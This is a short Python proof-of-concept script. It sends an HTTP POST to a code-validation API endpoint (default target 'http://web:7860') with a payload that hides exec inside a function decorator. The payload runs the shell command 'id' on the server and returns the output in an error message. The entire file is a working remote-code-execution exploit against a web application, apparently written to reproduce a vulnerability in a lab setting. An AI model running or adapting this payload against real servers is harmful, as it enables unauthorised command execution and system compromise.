import os
import requests

target_url = os.getenv("TARGET_URL", "http://web:7860").rstrip("/")
url = f"{target_url}/api/v1/validate/code"

data = {
    "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"
}

print(f"[*] Sending PoC request to {url}")

response = requests.post(url, json=data, timeout=15)

print(f"[*] HTTP {response.status_code}")

try:
    print(response.json())
except requests.exceptions.JSONDecodeError:
    print(response.text)
